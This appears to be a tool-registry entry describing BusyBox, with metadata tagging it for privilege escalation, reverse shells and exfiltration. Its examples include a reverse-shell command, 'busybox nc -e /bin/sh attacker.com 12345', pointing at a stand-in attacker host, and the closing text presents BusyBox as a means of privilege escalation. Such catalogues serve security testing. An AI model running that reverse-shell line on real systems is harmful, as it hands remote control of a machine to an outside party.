---
id: system-embedded-busybox
namespace: system:embedded:busybox
name: busybox
description: Multi-call binary that combines many Unix utilities in a single executable for embedded systems.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - security.execution.command
  - security.execution.reverse-shell
  - network.transfer.upload
  - system.file.read
  - system.file.write
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - ash
  - cat
  - nc
  - bash
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - file-content
    - reverse-shell
  consumes:
    - command-string
contract:
  inputs:
    - type: system.command.string
      description: BusyBox applet and arguments
  outputs:
    - type: process.output
      description: Command execution output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 2
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 2
  network: low
  disk_io: low
allowed-tools:
  - busybox
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "busybox {0}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn interactive ash shell via busybox
    command: busybox ash
  - description: Spawn reverse shell via busybox nc
    command: busybox nc -e /bin/sh attacker.com 12345
  - description: Serve files via HTTP for upload
    command: busybox httpd -f -p 12345 -h .
  - description: Read file via busybox cat
    command: busybox cat /path/to/input-file
references:
  - label: "BusyBox documentation"
    url: "https://busybox.net/downloads/BusyBox.html"
techniques:
  - privilege-escalation
  - execution
  - exfiltration
  - persistence
install:
    - method: apt
      package_name: "busybox"
      commands:
        - "apt-get install -y busybox"
---


# BusyBox — Multi-Call Binary

BusyBox combines many common Unix utilities into a single executable. Run `busybox --list-full` to see all available applets. It is especially useful in embedded systems and container environments for privilege escalation and file transfer.
